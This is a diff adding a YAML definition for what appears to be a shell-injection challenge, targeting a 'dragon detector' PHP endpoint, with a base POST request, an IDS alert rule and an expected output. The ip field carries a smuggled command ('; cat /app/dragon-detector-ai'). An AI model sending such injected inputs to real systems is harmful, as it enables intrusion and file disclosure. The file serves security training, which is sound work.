@@ -1,0 +1,28 @@
+name: 'Shell Injection (Param)'
+type: 'exploit'
+
+text: |-
+  **Goal: Print (`cat`) the file `/app/dragon-detector-ai`**.
+
+hints: []
+
+target:
+  dev:
+    host: localhost
+    port: 10001
+  prod:
+    host: detector
+    port: 80
+
+base_request: |-
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 10
+
+  ip=1.2.3.4; cat /app/dragon-detector-ai
+
+rules:
+- 'alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'
+
+expected_output: "This doesn't actually do anything"
